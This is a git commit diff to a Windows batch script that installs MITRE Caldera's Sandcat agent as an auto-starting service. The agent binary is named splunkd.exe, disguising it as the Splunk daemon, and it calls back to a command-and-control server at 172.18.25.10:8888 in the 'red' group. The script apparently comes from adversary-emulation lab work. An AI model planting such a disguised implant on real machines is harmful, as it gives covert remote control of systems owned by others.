b6f3c1bb277ba21b560b43eb27eafcca10355d7e
uenouan <uenotakabon@gmail.com>
2025-05-21 01:11:00 +0900

    updated

--- agent/install_sandcat_service.bat
+++ agent/install_sandcat_service.bat
@@ -1,4 +1,4 @@
-nssm.exe install SandcatAgent splunkd.exe --server http://172.18.25.10:8888 --group red
+C:\Tools\nssm.exe install SandcatAgent C:\Users\Public\splunkd.exe --server http://172.18.25.10:8888 --group red
 sc config SandcatAgent start= auto
 sc description SandcatAgent "Sandcat agent service for Caldera connection."
 sc start SandcatAgent
